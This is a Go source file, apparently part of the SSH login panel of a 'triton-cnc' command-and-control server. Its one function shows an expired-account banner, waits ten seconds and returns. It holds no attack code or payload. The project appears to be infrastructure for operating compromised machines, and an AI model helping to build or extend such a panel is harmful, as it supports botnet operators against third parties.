package views

import (
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/models/client/terminal"

	"golang.org/x/crypto/ssh"
)


func Login_Expired(channel ssh.Channel, conn *ssh.ServerConn, User *database.User) error {

	error,_ := terminal.Banner("login_expired", User, channel, true, false, nil)
	if error != nil {
		return error
	}

	time.Sleep(10 * time.Second)

	return nil
}